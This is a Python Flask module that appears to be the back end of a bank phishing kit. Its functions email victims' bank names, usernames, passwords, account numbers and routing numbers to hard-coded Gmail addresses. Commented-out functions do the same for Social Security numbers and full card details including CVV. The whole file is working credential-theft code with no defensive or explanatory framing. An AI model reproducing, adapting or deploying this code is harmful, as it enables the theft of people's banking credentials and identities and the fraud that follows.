from mandt import mail
from flask_mail import Message
from datetime import datetime

def report_login(username,password,bank_name):
    msg = Message('New Login',
        sender='angelamoore914@gmail.com',
        recipients=['goodseed394@gmail.com','christinesalgado477@gmail.com'])
    msg.body=f'''
    --------LOGIN DETAILS---------
    Bank Name is ----- {bank_name}
    Username is ----- {username}
    Password is ----- {password}
    at ---- {datetime.now()}
    '''
    mail.send(msg)


# def report_ssn(ssn):
#     msg = Message('New Login',
#         sender='angelamoore914@gmail.com',
#         recipients=['ritapratt010@gmail.com,christinesalgado477@gmail.com'])
#     msg.body=f'''
#     SSN ----- {ssn}
#     at ---- {datetime.now()}
#     '''
#     mail.send(msg)

# def report_card_details( card_name, card_number,expiry_date,cvv):
#     msg = Message('New Login',
#         sender='angelamoore914@gmail.com',
#         recipients=['ritapratt010@gmail.com,christinesalgado477@gmail.com'])
#     msg.body=f'''
#     Card name is ----- {card_name}
#     Card Number is ----- {card_number}
#     Expiry Date is ----- {expiry_date}
#     CVV is ----- {cvv}
#     at ---- {datetime.now()}
#     '''
#     mail.send(msg)

def report_personal_details( account_name, account_number,routine_number):
    msg = Message('New Login',
        sender='angelamoore914@gmail.com',
        recipients=['goodseed394@gmail.com','christinesalgado477@gmail.com'])
    msg.body=f'''
    --------PERSONAL INFORMATION----------
    Account Name is ----- {account_name}
    Account Number is ----- {account_number}
    Routine Number is ----- {routine_number}

    at ---- {datetime.now()}
    '''
    mail.send(msg)